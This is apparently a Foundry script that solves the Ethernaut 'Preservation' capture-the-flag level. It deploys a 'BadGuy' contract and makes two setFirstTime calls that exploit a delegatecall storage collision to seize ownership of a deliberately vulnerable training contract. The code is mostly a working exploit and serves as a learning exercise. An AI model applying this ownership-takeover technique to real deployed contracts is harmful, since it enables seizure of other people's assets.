// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Preservation } from "../src/Preservation.sol";

contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

contract BadGuy {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 me) public {
        owner = address(uint160(me));
    }
}

contract PreservationSolver is Script {

    Preservation public instance = Preservation(0xe627721096173d10614243d796D0Df59014C91d3);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        
        console.log("before --> ", instance.owner());

        BadGuy badGuy = new BadGuy();
        instance.setFirstTime(uint256(uint160(address(badGuy))));
        instance.setFirstTime(uint256(uint160(address(me))));

        console.log("after --> ", instance.owner());



        // some tests just to see that the two address are real contracts

        // LibraryContract l1 = LibraryContract(instance.timeZone1Library());
        // LibraryContract l2 = LibraryContract(instance.timeZone2Library());


        // console.log(address(uint160(uint256(vm.load(address(l1), 0)))));
        // console.log(address(uint160(uint256(vm.load(address(l2), 0)))));

        // l1.setTime(1337);
        
        // console.log(address(uint160(uint256(vm.load(address(l1), 0)))));
        // console.log(address(uint160(uint256(vm.load(address(l2), 0)))));
        
        // l2.setTime(1337);
        
        // console.log(address(uint160(uint256(vm.load(address(l1), 0)))));
        // console.log(address(uint160(uint256(vm.load(address(l2), 0)))));

        vm.stopBroadcast();

    }

}

